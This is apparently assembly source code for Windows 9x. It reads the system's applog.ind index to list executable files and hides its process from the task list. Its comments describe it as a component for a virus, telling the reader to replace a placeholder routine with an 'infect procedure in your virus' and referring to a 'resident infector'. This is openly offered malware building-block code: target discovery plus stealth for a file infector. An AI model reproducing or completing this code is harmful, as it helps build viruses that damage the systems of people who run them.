   includelib kernel32.lib
   includelib user32.lib
   includelib wsock32.lib

   .486
   .model flat, stdcall

   include c:\masm\include\windows.inc
   include c:\masm\include\wsock32.inc
   include c:\masm\include\kernel32.inc
   include c:\masm\include\user32.inc


   ShortString struct dword
           FileName           BYTE    8 dup (?)
   ShortString ends

   APPLOG_FILE_HEADER struct dword
           FileName                byte    8 dup (?)
           PathOffset              dword   ?
           NoOfRunsSinceDefrag     word    ?
           NoOfRuns                word    ?
           FileDataTime            FILETIME <>     ; relative to what?
           FileSize                dword   ?
           Flags                   dword   ?       ; Dont know anything about
                                                   ; this either
   APPLOG_FILE_HEADER ends

   LISTFILE_HEADER struct dword
           HashCount               dword   ?       ; Number of found files
           NamesEnd                dword   ?       ; Pointer where to write
                                                   ; new filenames
           NamesBegin              dword   ?       ; Where the names begin
   LISTFILE_HEADER ends

   .data
           ListFilePtr             dd      0

           ListFileName            db      "listfile.txt",0
           ApplogFilename          db      "\applog\applog.ind",0
           Temp                    dd      0




   .code

     MyOpenFile:
           xor     edx,edx
           invoke  CreateFileA, eax, ebx, edx, edx, ecx, edx, edx
           mov     ebx,eax
           cmp     eax,INVALID_HANDLE_VALUE
           ret

   MyReadFile proc Filename:dword, MemPtr:dword
           pushad
           xor     esi,esi
           mov     eax,Filename
           mov     ebx,GENERIC_READ
           mov     ecx,OPEN_EXISTING
           call    MyOpenFile
           jz      Error

           push    eax                             ; CloseHandle

           push    esi                             ; ReadFile, 0
           push    offset Temp                     ; ReadFile, Bytes Read
           mov     edi,eax

           invoke  GetFileSize, eax, esi
           push    eax                             ; ReadFile, How much to read

           add     eax,10                          ; allocate 10+FileSize bytes
           invoke  LocalAlloc, LMEM_ZEROINIT, eax
           mov     ecx,MemPtr
           mov     [ecx],eax

           push    eax                             ; ReadFile, Where to read it
           push    edi                             ; ReadFile, File Handle
           call    ReadFile

           call    CloseHandle

           popad
           ret
   MyReadFile endp

   AddStringToFilelist proc uses ebx Filename:dword
           mov     eax,Filename
           mov     ebx,GENERIC_READ
           mov     ecx,OPEN_EXISTING
           call    MyOpenFile                      ; open the file
           jz      FoundNoFile                     ; Resident infector will then
                                                   ; infect the file
           invoke  CloseHandle, ebx
         FoundNoFile:
           ret

   AddStringToFilelist endp




   CreateDirListing proc uses ebx esi edi
           local   FileMem:dword
           local   Files:dword
           local   ApplogWholeFileName:dword
           local   ApplogFileStr:ShortString



           invoke  LocalAlloc, LMEM_ZEROINIT, 300
           mov     ebx, eax
           invoke  GetWindowsDirectory, ebx, 300
           add     eax, ebx
           invoke  lstrcpy, eax, offset ApplogFilename

           lea     esi, FileMem
           invoke  MyReadFile, ebx, esi
           invoke  LocalFree, ebx

           mov     esi, [esi]
           mov     eax,'LPPA'                      ; is this really applog.ind
           cmp     [esi],eax
           jnz     Error


           invoke  LocalAlloc, LMEM_ZEROINIT, 300
           mov     edi, eax

           mov     ebx, [esi+10h]                  ; number of files on system
           mov     Files, ebx

           add     esi, 64+344                     ; esi -> filenames
           assume  esi:ptr APPLOG_FILE_HEADER

       FindFilesLoop:
           mov     eax,[esi].PathOffset            ; more relative pointer
                                                   ; to path to eax
           mov     ecx,Files
           imul    ecx,ecx,20h                     ; ecx = FILE_ENTRY_STRUCTs
           add     ecx,FileMem                     ; size

           lea     eax,[64+344+ecx+eax]            ; make relativ pointer into
                                                   ; real offset
                                                   ; eax = Relative pointer +
                                                   ; First and second header +
                                                   ; File entries structures =
                                                   ; pointer to path

           invoke  lstrcpy, edi, eax               ; copy path to edi
           invoke  lstrlen, eax
           add     eax, edi
           mov     byte ptr [eax],'\'
           inc     eax
           invoke  lstrcpyn, eax, esi, 9           ; copy filename to edi
           invoke  lstrlen, edi
           mov     ecx,'EXE.'
           mov     [eax+edi],ecx
           xor     ecx,ecx
           mov     byte ptr [eax+edi+4],cl

           invoke  AddStringToFilelist, edi        ; replace with infect
                                                   ; procedure in your virus

           add     esi, sizeof(APPLOG_FILE_HEADER)

           dec     ebx
           jnz     FindFilesLoop

           invoke  LocalFree, FileMem
           ret





   CreateDirListing endp

   Kernel32                db      "kernel32",0
   RegisterService         db      "RegisterServiceProcess", 0
   HideProgram:
           invoke  GetModuleHandleA, offset Kernel32
           invoke  GetProcAddress, eax, offset RegisterService
           test    eax,eax
           jz      NoHide
           push    1
           push    0
           call    eax
        NoHide:
           ret

   Main:
           call    HideProgram
           call    CreateDirListing
   Error:
           invoke  ExitProcess, 0

   end Main
